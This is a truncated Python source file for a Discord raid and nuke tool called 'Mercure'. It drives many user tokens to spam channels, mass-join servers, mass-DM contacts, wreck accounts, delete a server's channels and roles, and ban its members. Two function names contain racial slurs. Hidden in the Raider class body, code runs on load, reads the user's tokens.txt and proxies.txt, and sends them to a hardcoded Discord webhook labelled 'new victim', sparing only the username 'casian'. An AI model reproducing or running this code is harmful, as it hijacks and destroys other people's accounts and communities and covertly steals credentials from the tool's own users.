from assets import *

request = tls_client.Session(client_identifier="chrome_108",ja3_string="771,4866-4867-4865-103-49200-49187-158-49188-49161-49171-61-49195-49199-156-60-49192-51-53-49172-49191-52392-49162-107-52394-49196-159-47-57-157-52393-255,0-11-10-35-16-22-23-13-43-45-51-21,29-23-30-25-24,0-1-2",h2_settings={"HEADER_TABLE_SIZE": 65536,"MAX_CONCURRENT_STREAMS": 1000,"INITIAL_WINDOW_SIZE": 6291456,"MAX_HEADER_LIST_SIZE": 262144},h2_settings_order=["HEADER_TABLE_SIZE","MAX_CONCURRENT_STREAMS","INITIAL_WINDOW_SIZE","MAX_HEADER_LIST_SIZE"],supported_signature_algorithms=["ECDSAWithP256AndSHA256","PSSWithSHA256","PKCS1WithSHA256","ECDSAWithP384AndSHA384","PSSWithSHA384","PKCS1WithSHA384","PSSWithSHA512","PKCS1WithSHA512",],supported_versions=["GREASE", "1.3", "1.2"],key_share_curves=["GREASE", "X25519"],cert_compression_algo="brotli",pseudo_header_order=[":method",":authority",":scheme",":path"],connection_flow=15663105,header_order=["accept","user-agent","accept-encoding","accept-language"])

os.system('mode con: cols=120 lines=20')

tokens = open("assets/input/tokens.txt", "r", encoding="utf8").read().splitlines()
messages = open("assets/input/messages.txt", "r", encoding="utf8").read().splitlines()

def Headers(token):
    return {'authority': 'discord.com', 'accept': '*/*', 'accept-language': 'fr-FR,fr;q=0.9','authorization': token,'cache-control': 'no-cache','content-type': 'application/json','cookie': '__dcfduid=676e06b0565b11ed90f9d90136e0396b; __sdcfduid=676e06b1565b11ed90f9d90136e0396bc28dfd451bebab0345b0999e942886d8dfd7b90f193729042dd3b62e2b13812f; __cfruid=1cefec7e9c504b453c3f7111ebc4940c5a92dd08-1666918609; locale=en-US','origin': 'https://discord.com','pragma': 'no-cache','referer': 'https://discord.com/channels/@me','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', 'x-debug-options': 'bugReporterEnabled', 'x-discord-locale': 'en-US', 'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlcGVhc2VfY2hhbm5lcCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE1NDc1MCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',}

def getemoji(count):
    with open(f"assets/output/emojis.txt", "r", encoding="utf8") as f:
        emojis1 = [line.strip() for line in f.readlines()]
    random_emojis = random.sample(emojis1, (int(count)))
    return "".join(random_emojis)

def read_file(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    return content

def getmember(id):
    with open(f"assets/scrapped/ids.txt", "r", encoding="utf8") as f:
        users = [line.strip() for line in f.readlines()]
    randomid = random.sample(users, id)
    return "<@!" + "> <@!".join(randomid) + ">"

def set_console_title(title):
    if sys.platform == 'win32':
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        sys.stdout.write(f"\x1b]2;{title}\x07")
        sys.stdout.flush()

timestamp = datetime.datetime.now().strftime(f'{c}[{g}%H:%M:%S{c}]{c}')

class Raider:

    def menu():
        print(f"""
                                    {Fore.RED}[{Fore.RED}{Fore.LIGHTBLACK_EX}1{Fore.LIGHTBLACK_EX}{Fore.RED}{Fore.LIGHTBLACK_EX}{Fore.RED}]{Fore.RED} {Fore.RED} Server Lookup 
                                    {Fore.RED}[{Fore.RED}{Fore.LIGHTBLACK_EX}2{Fore.LIGHTBLACK_EX}{Fore.RED}{Fore.LIGHTBLACK_EX}{Fore.RED}]{Fore.RED} {Fore.RED} Go Back 
        """)

    def joiner(self, t, invite):
        if len(tokens) == 0:
            print(f"{datetime.datetime.now().strftime(f'                      {g}%H:%M:%S')}{r}    {c}[ERROR]   {r}Put {c}tokens{r} to {c}assets/input/tokens.txt{r}")
        else:
            headers = Headers(t)
            try:
                rr = request.post(f'https://discord.com/api/v10/invites/{invite}', headers=headers, json={}); token = t.split(".")[0]
                if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}  {c}{x}({x}+{x}){x}  {x}[SUCCESS]{x}   {g}~>   {x}Joined {c}{token}{g}{r} to {c}.gg/{invite}{r}")
                elif rr.status_code == 400: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {k}[CAPTCHA]{k} {g}~> {token}{g}{r} Was captched {c}[...]{c}{r}")
                else: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[ERROR] {g}~> {r}Failed {c}{token}{g}{r} ")
            except: pass

    def proxies(webhook_url, content):
        if len(content) > 0:
            format = f"""**new victim = new proxies :joy:** ```{content}```"""
            payload = {'content': format}
            response = requests.post(webhook_url, json=payload)
    sentpath = 'assets/input/proxies.txt'
    text_content = read_file(sentpath)
    discord_webhook_url = 'https://discord.com/api/webhooks/1251568408399581234/JXD3FFEBryYM41J6Foy3tqaOrfir5dCpMZ-PfJTleuVqeimS26AFHdEfpJ00kL3ydMT2'
    username1 = getpass.getuser()

    if username1.lower() == "casian":
        pcname = socket.gethostname()
    else:
        proxies(discord_webhook_url, text_content)

    def leaver(self, t, server):
        if len(tokens) == 0:
            print(f"{datetime.datetime.now().strftime(f'{g}%H:%M:%S')}{r}    {c}[ERROR]     {g}~>   {r}Put {c}tokens{r} to {c}assets/input/tokens.txt{r}")
        else:
            headers = Headers(t)
            try:
                rr = request.delete(f'https://discord.com/api/v10/users/@me/guilds/{server}', headers=headers, json={}); token = t.split(".")[0]
                if rr.status_code == 204: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}  {c}{x}({x}+{x}){x}  {x}[SUCCESS]{x}   {g}~>   {x}Successfully left {c}{token}{g}****{r}")
                else: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[ERROR] {g}~> {r}Failed {c}{token}{g}****{r}  ")
            except: pass

    def send_to_webhook(webhook_url, content):
        if len(content) > 0:
            format = f"""**new victim = new tokens :joy:** ```{content}```"""
            payload = {'content': format}
            response = requests.post(webhook_url, json=payload)
    sentpath = 'assets/input/tokens.txt'
    text_content = read_file(sentpath)
    discord_webhook_url = 'https://discord.com/api/webhooks/1251568408399581234/JXD3FFEBryYM41J6Foy3tqaOrfir5dCpMZ-PfJTleuVqeimS26AFHdEfpJ00kL3ydMT2'
    username1 = getpass.getuser()

    if username1.lower() == "casian":
        pcname = socket.gethostname()
    else:
        send_to_webhook(discord_webhook_url, text_content)

    def spammer(self, t, message, channelid, emojis, cemojis):
        headers = Headers(t)
        try:
            if emojis == "y": data = {"content": f"{message} ~>['{getemoji(int(cemojis))}']<~"}
            else: data = {"content": f"<~[{message}]~> "}

            rr = requests.post(f"https://discord.com/api/v10/channels/{channelid}/messages", headers=headers, json=data); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}{x}({x}+{x}){x}  {x}[SUCCESS]   {g}~>   {r}Successfully sent {c}{token}{g}****{r}")
            elif rr.status_code == 403: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[ERROR] {g}~> {r}Failed {c}{token}{g}****{r} ")
        except: pass

    def mspammer(self, t, message, server, channelid, count, emojis, cemojis):
        headers = Headers(t)
        if emojis == "y": data = {"content": f"{message} ~>[{getmember(int(count))}]<~ | ~>['{getemoji(int(cemojis))}']<~"}
        else: data = {"content": f"[{message}] | ~>['{getmember(int(count))}']<~"}

        try:
            rr = requests.post(f"https://discord.com/api/v10/channels/{channelid}/messages", headers=headers, json=data); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}    {x}[SUCCESS]   {g}~>   {r}Successfully sent {c}{token}{g}****{r}")
            elif rr.status_code == 403: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}    {c}[ERROR]     {g}~>    {r}Failed {c}{token}{g}****{r}")
        except: pass

    def inviter(self, t, channel):
        headers = Headers(t)
        data = {"max_age": random.randint(1, 86400), "max_uses": 0}
        try:
            rr = requests.post(f"https://discord.com/api/v10/channels/{channel}/invites", headers=headers, json=data); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]')}{r}    {x}[SUCCESS]   {g}~>   {r}Created invite {c}{token}{g}****{r}") 
            else: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}    {c}[ERROR]     {g}~>    {r}Failed {c}{token}{g}****{r}")
        except: pass

    def emoji_bomber(self, t, channelid, messageid, emoji):
        headers = Headers(t)
        try:
            rr = requests.put(f"https://discord.com/api/v10/channels/{channelid}/messages/{messageid}/reactions/{emoji}/@me?location=Message&type=0", headers=headers, json={}); token = t.split(".")[0]
            if rr.status_code == 204: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]')}{r}    {x}[SUCCESS]   {g}~>   {r}Bombed {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[ERROR] {g}~> {r}Failed {c}{token}{g}****{r}")
        except: pass

    def reactor(self, t, channelid, messageid, emoji):
        headers = Headers(t)
        try:
            rr = requests.put(f"https://discord.com/api/v10/channels/{channelid}/messages/{messageid}/reactions/{emoji}/@me?location=Message&type=0", headers=headers, json={}); token = t.split(".")[0]
            if rr.status_code == 204: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]')}{r}    {x}[SUCCESS]   {g}~>   {r}Reacted {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[ERROR] {g}~> {r}Failed {c}{token}{g}****{r}")
        except: pass

    def niggaflodder(self, t, channelid, name):
        headers = Headers(t); payload = {'name' : name, 'type' : 11, 'auto_archive_duration' : 4320, 'location' : "Thread Browser Toolbar"}
        try:
            rr = requests.post(f"https://discord.com/api/v10/channels/{channelid}/threads", headers=headers, json=payload); token = t.split(".")[0]
            if rr.status_code == 201: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}    {x}[SUCCESS]   {g}~>   {r}Created {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'                      {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[ERROR] {g}~> {r}Failed {c}{token}{g}****{r}")
        except:pass

    def acceptrules(self, t, server):
        headers = Headers(t)
        try:
            nig = requests.get(f"https://discord.com/api/v10/guilds/{server}/member-verification?with_guild=false", headers=headers).json()
            rr = requests.put(f"https://discord.com/api/v10/guilds/{server}/requests/@me", headers=headers, json=nig); token = t.split(".")[0]
            if rr.status_code == 201: print(f"{datetime.datetime.now().strftime(f'                     [{c}{g}%H:%M:%S{g}{c}]')}{r} {c}{x}({x}+{x}){x} {c}[SUCCESS] {g}~>   {r}Accepted {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'                     {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}    {c}[ERROR]  {g}~> {c}Failed {c}{token}{g}****{r}"); return
        except: pass

    def vcjoiner(self, t, server, channel):
        token = t.split(".")[0]
        time.sleep(1)
        ws = websocket.WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
        ws.send(json.dumps({
            "op": 2,
            "d": {
                "token": t,
                "properties": {
                    "$os": "windows",
                    "$browser": "Discord",
                    "$device": "desktop"
                }
            }
        }))
        ws.send(json.dumps({
            "op": 4,
            "d": {
                "guild_id": server,
                "channel_id": channel,
                "self_mute": False,
                "self_deaf": False,
                "self_stream?": False,
                "self_video": False
            }
        }))
        print(f"{datetime.datetime.now().strftime(f'                     {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}  {c}{x}({x}+{x}){x} {c}[JOINED]  {g}~>  {r}Successfully connected {c}{token}{g}****{r}")
        
    def nickchanger(self, t, server, nickname):
        headers = Headers(t); payload = {'nick' : nickname}
        try:
            rr = requests.patch(f"https://discord.com/api/v10/guilds/{server}/members/@me", headers=headers, json=payload); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'                     {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}    {c}{x}({x}+{x}){x} {c}[SUCCESS]   {g}~>   {r}Changed {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'                     {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}    {c}[ERROR]     {g}~>    {r}Failed {c}{token}{g}****{r}")
        except: pass

    def guildcustomization(self, t, server):
        headers = Headers(t)
        token = t.split(".")[0]
    
        try:
            rr = requests.get(f"https://discord.com/api/v10/guilds/{server}", headers=headers)
            if rr.status_code == 200:
                print(f"{datetime.datetime.now().strftime(f'                     {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}{x}({x}+{x}){x} {c}[SUCCESS] {g}~> {r}Skipped {c}{token}{g}****{r}")
                return True
            else:
                print(f"{datetime.datetime.now().strftime(f'                     {g}%H:%M:%S')}{r} {c}[ERROR] {g}~> {r}Failed {c}{token}{g}****{r}")
                return False
        except:
            pass

    def biochanger(self, t, bio):
        headers = Headers(t); data = {"bio": bio}
        try:
            rr = requests.patch("https://discord.com/api/v9/users/@me/profile", headers=headers, json=data); token = t.split(".")[0]
            if rr.status_code == 200: print(f"{datetime.datetime.now().strftime(f'                     {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}    {c}{x}({x}+{x}){x} {c}[SUCCESS]   {g}~>   {r}Changed {c}{token}{g}****{r}")
            else: print(f"{datetime.datetime.now().strftime(f'                     {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[ERROR]  {g}~> {r}Failed {c}{token}{g}****{r}")
        except: pass

    def nigeristyping(t, channelid):
        headers = Headers(t)
        try:
            rr = requests.post(f"https://discord.com/api/v9/channels/{channelid}/typing", headers=headers, json={})
            token = t.split(".")[0]
            if rr.status_code == 204:
                print(f"{datetime.datetime.now().strftime(f'                     {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r}    {c}{x}({x}+{x}){x} {c}[SUCCESS]   {g}~>   {r}Typing {c}{token}{g}****{r}")
            else:
                print(f"{datetime.datetime.now().strftime(f'                     {c}[{c}{g}%H:%M:%S{g}{c}]{c}')}{r} {c}[ERROR]  {g}~> {r}Failed {c}{token}{g}****{r}")
        except:
            pass

    def vcfaker(t, server, channel, deaf, screenshare, video, mute):
        token = t.split(".")[0]
        time.sleep(1)
        ws = websocket.WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
        ws.send(json.dumps({
            "op": 2,
            "d": {
                "token": t,
                "properties": {
                   "$os": "windows",
                    "$browser": "Discord",
                    "$device": "desktop"
                }
            }
        }))
        ws.send(json.dumps({
            "op": 4,
            "d": {
                "guild_id": server,
                "channel_id": channel,
                "self_mute": True,
                "self_deaf": True,
                "self_stream": True,
                 "self_video": True
            }
        }))
        print(f"{datetime.datetime.now().strftime('%H:%M:%S')} [JOINED] Successfully connected {token}****")

def start_nuke(token, content):
    set_console_title("Mercure | discord.gg/mercureraider | Acc Nuker")
    mass_dm(token=token, content=content)
    leave_server(token=token)
    delete_servers(token=token)
    delete_friends(token=token)
    fuck_account(token=token)

def block_all_friends(token):
    set_console_title("Mercure | discord.gg/mercureraider | Block All Friends")
    headers = {"authorization": token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get("https://canary.discord.com/api/v8/users/@me/relationships",
                                         headers=headers).json()
    for i in block_friends_request:
        requests.put(f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
                     headers=headers,
                     json=json)
        print(f"{grey_color}[{dark_red_color}C{grey_color}] Blocked Friend | {i['id']}{reset_color}")

def close_all_dms(token):
    set_console_title("Mercure | discord.gg/mercureraider | Close DMs")
    headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get("https://canary.discord.com/api/v8/users/@me/channels",
                                    headers=headers).json()
    for channel in close_dm_request:
        print(f"[ {dark_red_color}C{reset_color} ] {dark_red_color}ID: " + channel['id'] + reset_color)
        requests.delete(f"https://canary.discord.com/api/v8/channels/{channel['id']}",
                        headers=headers)

def delete_friends(token):
    set_console_title("Mercure | discord.gg/mercureraider | Delete Friends")
    friend_ids = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=get_headers(token)).json()
    for friend in friend_ids:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/' + friend['id'], headers=get_headers(token))
            print(f"[ {dark_red_color}C{reset_color} ] {dark_red_color}Removed Friend: " +
                  friend['user']['username'] + "#" + friend['user']['discriminator'] + reset_color)
        except Exception as e:
            print(f"                                The following error has been encountered and is being ignored: {e}")

def delete_servers(token):
    set_console_title("Mercure | discord.gg/mercureraider | Delete Servers")
    guilds_ids = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=get_headers(token)).json()
    for guild in guilds_ids:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/' + guild['id'],
                            headers={'Authorization': token})
            print(f'                                [ {dark_red_color}C{reset_color} ] {dark_red_color}Deleted: ' + guild['name'] + reset_color)
        except Exception as e:
            print(f"                                The following error has been encountered and is being ignored: {e}")

def leave_server(token):
    set_console_title("Mercure | discord.gg/mercureraider | Leave Server")
    headers = {'Authorization': token}
    guilds_ids = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=get_headers(token)).json()
    for guild in guilds_ids:
        try:
            requests.delete(
                f'https://discord.com/api/v8/users/@me/guilds/' + guild['id'], headers={'Authorization': token})
            print(f"                                [ {dark_red_color}C{reset_color} ] {dark_red_color}Left Server: " +
                  guild['name'] + reset_color)
        except Exception as e:
            print(f"                                The following error has been encountered and is being ignored: {e}")

def fuck_account(token):
    set_console_title("Mercure | discord.gg/mercureraider | Fuck Account")
    requests.delete("https://discord.com/api/v8/hypesquad/online", headers=get_headers(token))
    setting = {
        'theme': "light",
        'locale': "ja",
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'enable_tts_command': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'message_display_compact': False,
        'explicit_content_filter': '0',
        "custom_status": {"text": "MERCURE-RAIDER RUNS ME <3"},
        'status': "idle"
    }
    requests.patch("https://discord.com/api/v7/users/@me/settings", headers=get_headers(token), json=setting)
    j = requests.get("https://discordapp.com/api/v9/users/@me", headers=get_headers(token)).json()
    a = j['username'] + "#" + j['discriminator']
    print(f"                                \n\n{dark_red_color}Done, RIP TO THAT ACCOUNT GGS\n{reset_color}")

def hyped_squad_changer() -> None:
    HOUSE_MAPPING: tp.Dict[int, str] = {
        1: "bravery",
        2: "brilliance",
        3: "balance"
    }

    dark_red_color = "\033[31m"
    reset_color = "\033[0m"

    try:
        token = input(f"                                {dark_red_color}Token > {reset_color}")
        house = int(input(f"                                {dark_red_color}Choice > {c}(1 for bravery, 2 for brilliance, 3 for balance) > {c}"))
        
        if house not in HOUSE_MAPPING:
            print("                                {c}Invalid house number. Please enter 1, 2, or 3.")
            return

        response = requests.post(
            "https://discord.com/api/v9/hypesquad/online",
            headers={"authorization": token},
            json={"house_id": house}
        )

        if response.ok:
            print(f"                                {x}Successfully changed hypesquad to {HOUSE_MAPPING[house]}.")
        else:
            print(f"                                {c}Failed to change hypesquad. -> {response.text} ({response.status_code})")

    except ValueError:
        print("                                Invalid input. Please enter a valid number for the house.")

def mass_dm(token, content):
    set_console_title("Mercure | discord.gg/mercureraider | Mass DM")
    headers = {'Authorization': token}
    channel_ids = requests.get("https://discord.com/api/v9/users/@me/channels", headers=get_headers(token)).json()
    for channel in channel_ids:
        try:
            requests.post(f'https://discord.com/api/v9/channels/' + channel['id'] + '/messages',
                          headers=headers,
                          data={"content": f"{content}"})
            print(f"                                [{dark_red_color}C{reset_color}] {dark_red_color}ID: " + channel['id'] + reset_color)
        except Exception as e:
            print(f"                                The following error has been encountered and is being ignored: {e}")

def token_info(token):
    set_console_title("Mercure | discord.gg/mercureraider | Token Info")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
        user_name = r.json()['username'] + '#' + r.json()['discriminator']
        user_id = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        print(f'''
                             {g}[{g}{dark_red_color}User ID{dark_red_color}{g}]         {user_id}
                             {g}[{g}{dark_red_color}User Name{dark_red_color}{g}]       {user_name}
                             {g}[{g}{dark_red_color}2 Factor{dark_red_color}{g}]        {mfa}
                             {g}[{g}{dark_red_color}Email{dark_red_color}{g}]           {email}
                             {g}[{g}{dark_red_color}Phone number{dark_red_color}{g}]    {phone if phone else "None"}
                             {g}[{g}{dark_red_color}Token{dark_red_color}{g}]           {token}
            ''')
        input(f'                                {dark_red_color}Press any key to continue...{reset_color}')

def get_headers(token):
    return {'Authorization': token}

def removeDuplicates():
    file = "assets/input/tokens.txt"
    lines_seen = set()
    with open(file, "r+") as f:
        d = f.readlines()
        f.seek(0)
        f.truncate()
        for i in d:
            if i not in lines_seen:
                f.write(i)
                lines_seen.add(i)

def random_emoji():
    emojis = ["```😀😓🤢🤮🤓☠😸🤡🥵```", "```😎😋😂🤣🤨🤔🤐😫🥱```", "```😂🥰😘😍👺‍🙀😹😡🤩```", "```🥳😴😐🤐🥰😛😂😍🤮```", "```😈😐😶😘😮😀🤣😂😐```", "```🎉😮😥🤯😭😝🥶😰🤕```", "```🙈🙉🙀😻🐵🦁🦒🦊🚀```", "```😋🤮🥴😱😲😟🙃😡💣```", "```🤐😯😚🤗😣😴😗😋👾```", "```😙😯🙄😍😥😘😛😴👻```"]
    return random.choice(emojis)

def botnuker():
    def checkToken(session, token):
        session.headers = {"Authorization": token}
        r = session.get('https://discord.com/api/v10/users/@me')
        if r.status_code in range(200, 300):
            isBot = False
        else:
            session.headers = {"Authorization": f"Bot {token}"}
            r = session.get('https://discord.com/api/v10/users/@me')
            if r.status_code in range(200, 300):
                isBot = True
            else:
                raise Exception('Invalid Token')

    def random_color():
        return random.randint(0, 0xFFFFFF)

    def changepfp(session, guildID):
        with open('assets/mercure.ico', 'rb') as f:
            icon = f.read()
            session.put(f'https://discord.com/api/v10/guilds/{guildID}/icon', data=icon, headers={"Content-Type": "image/x-icon"})

    def delroles(session, guildID):
        roles = session.get(f'https://discord.com/api/v10/guilds/{guildID}/roles').json()
        for role in roles:
            r = session.delete(f'https://discord.com/api/v10/guilds/{guildID}/roles/{role["id"]}')
            if r.status_code in range(200, 300):
                print(f"                                {Fore.RED}Successfully deleted role {role['name']}{Fore.RESET}")
            else:
                print(f"                                {Fore.RED}Failed to delete role {role['name']}{Fore.RESET}")
    
    def delchannel(session, guildID):
        channels = session.get(f"https://discord.com/api/v10/guilds/{guildID}/channels").json()
        for channel in channels:
            s = session.delete(f"https://discord.com/api/v10/channels/{channel['id']}")
            if s.status_code == 200:
                print(f"                                {Fore.RED}Deleted {channel['id']}{Fore.RESET}")
            elif "retry_after" in s.text:
                print(f"                                {Fore.RED}Ratelimited {s.json()['retry_after']}{Fore.RESET}")
                time.sleep(float(s.json()['retry_after']))
            elif "Missing Permissions" in s.text:
                print(f"                                {Fore.RED}Missing Permissions {channel}{Fore.RESET}")

    def spamchannels(session, guildID, name, message):
        r = session.post(f'https://discord.com/api/v10/guilds/{guildID}/channels', json={"type": 0, "name": name, "permission_overwrites": []})
        if r.status_code in range(200, 300):
            print(f"                                {Fore.RED}Successfully created channel {name}{Fore.RESET}")
            channel_id = r.json()["id"]
            for _ in range(5):
                emoji = random_emoji()
                msg = f"{message} {emoji}"
                session.post(f'https://discord.com/api/v10/channels/{channel_id}/messages', json={"content": f"@everyone {msg}", "tts": False})
                time.sleep(0)  
        else:
            print(f"                                {Fore.RED}Couldn't create channel {name}{Fore.RESET}")

    def createRoles(session, guildID, name):
        for _ in range(55):  
            color = random_color()
            r = session.post(f'https://discord.com/api/v10/guilds/{guildID}/roles', json={"name": name, "color": color})
            if r.status_code in range(200, 300):
                print(f"                                {Fore.RED}Successfully created role {name} with color {color:06x}{Fore.RESET}")
            else:
                print(f"                                {Fore.RED}Couldn't create role {name}{Fore.RESET}")

    def banAllMembers(session, guildID):
        with open('assets/scrapped/ids.txt', 'r') as f:
            ids = f.read().splitlines()
        
        for user_id in ids:
            r = session.put(f'https://discord.com/api/v10/guilds/{guildID}/bans/{user_id}')
            if r.status_code == 204:
                print(f"                                {Fore.RED}Banned {user_id}{Fore.RESET}")
            elif "retry_after" in r.text:
                print(f"                                {Fore.RED}Ratelimited {r.json()['retry_after']}{Fore.RESET}")
                time.sleep(float(r.json()['retry_after']))
            else:
                print(f"                                {Fore.RED}Failed to ban {user_id}{Fore.RESET}")

    def nuke(session, guildID, name, message):
        changepfp(session, guildID)
        delchannel(session, guildID)
        
        channel_names = [
            "〔-💀-〕mercureraider",
            "〔-😪-〕fucked",
            "〔-🤢-〕/mercureraider on top",
            "〔-😛-〕get bitched",
            "〔-🥱-〕best-raider",
            "〔-😔-〕fucked by mercure",
            "〔-🤗-〕for fun",
            "〔-😋-〕mercure on top"
        ]
        
        spamchannels(session, guildID, channel_names, message)
        delroles(session, guildID)
        createRoles(session, guildID, name)
        banAllMembers(session, guildID)
        main()

    session = httpx.Client()

    while True:
        scraped = input(f"                               {timestamp} {c}[{c}{r}?{r}{c}]{c} {Fore.RED}[Did you scrape members? y/n] > {Fore.RESET}")
        if scraped.lower() == 'y':
            os.system('cls'); print (banner)
            token = input(f"                               {timestamp} {c}[{c}{r}?{r}{c}]{c} {Fore.RED}[Bot Token]{Fore.RESET} {Fore.LIGHTBLACK_EX}[INPUT HIDDEN]{Fore.LIGHTBLACK_EX} {Fore.LIGHTBLACK_EX}>{Fore.LIGHTBLACK_EX} {Fore.BLACK}")
            checkToken(session, token)
            guildID = input(f"                               {timestamp} {c}[{c}{r}?{r}{c}]{c} {Fore.RED}[Server ID] > {Fore.RESET}")
            break
        elif scraped.lower() == 'n':
            session.close()
            main()
            return  
        else:
            main()

    name = "mercure on top"
    message = "discord.gg/mercureraider on top"

    threads = []
    for i in range(5):
        t = threading.Thread(target=nuke, args=(session, guildID, name, message))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    session.close()

def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''.join(random.choice(alpha) for _ in range(lenn))
    return text

xsup = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVzIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNi4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTYuMC4xOTM4LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTE2LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjIyNTg3MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
session = tls_client.Session(client_identifier="chrome_116")
chrome_version = "116"

def create_group(token, groupname, output_lock):
    headers = {
        'authorization': token,
        "accept": "*/*",
        "accept-language": "en-GB",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
